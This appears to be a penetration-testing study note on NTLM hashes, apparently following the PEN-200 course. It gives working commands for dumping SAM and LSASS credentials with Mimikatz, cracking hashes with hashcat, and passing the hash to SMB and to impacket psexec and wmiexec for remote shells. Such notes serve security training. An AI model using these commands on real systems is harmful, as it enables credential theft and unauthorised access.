# NTLM Hashes and Pass-the-Hash

## NTLM vs Net-NTLMv2

```text
NTLM hash
  = Windows password hash stored/cached locally
  = Hashcat mode 1000
  = can often be used directly for Pass-the-Hash

Net-NTLMv2
  = network challenge-response generated during authentication
  = Hashcat mode 5600
  = crack it or relay the authentication
```

## Dump local NTLM hashes with Mimikatz

Mimikatz needs sufficient privilege. Chapter 13 enables **SeDebugPrivilege**, elevates to SYSTEM, then dumps the SAM:

```text
privilege::debug
token::elevate
lsadump::sam
```

`sekurlsa::logonpasswords` targets credentials available through LSASS and also requires the necessary privilege level.

Crack an NTLM hash:

```bash
hashcat -m 1000 ntlm.hash \
  /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule
```

## Pass-the-Hash to SMB

```bash
smbclient \\\\<TARGET_IP>\\<SHARE> -U Administrator --pw-nt-hash <NTLM_HASH>
```

Inside `smbclient`:

```text
dir
get <FILE>
```

## Pass-the-Hash for command execution

Impacket expects `LMHash:NTHash`. When only the NTLM hash is available, Chapter 13 fills the LM side with 32 zeros:

```bash
impacket-psexec -hashes \
  00000000000000000000000000000000:<NTLM_HASH> \
  Administrator@<TARGET_IP>
```

`psexec` commonly yields a **SYSTEM** shell because of how the service-based execution works.

```bash
impacket-wmiexec -hashes \
  00000000000000000000000000000000:<NTLM_HASH> \
  Administrator@<TARGET_IP>
```

`wmiexec` yields a shell as the authenticated user in the PEN-200 example.

## Important standalone-Windows limitation

For remote code execution with local accounts, **UAC remote restrictions** can block administrative actions for members of the local Administrators group other than the built-in local `Administrator` account. A reusable hash is not automatically equivalent to remote admin code execution.

## Quick chain

```text
admin/SYSTEM access
  → Mimikatz privilege::debug
  → token::elevate
  → lsadump::sam
  → NTLM hash
      ├─ crack mode 1000 → plaintext
      └─ Pass-the-Hash → SMB / psexec / wmiexec / supported service
```
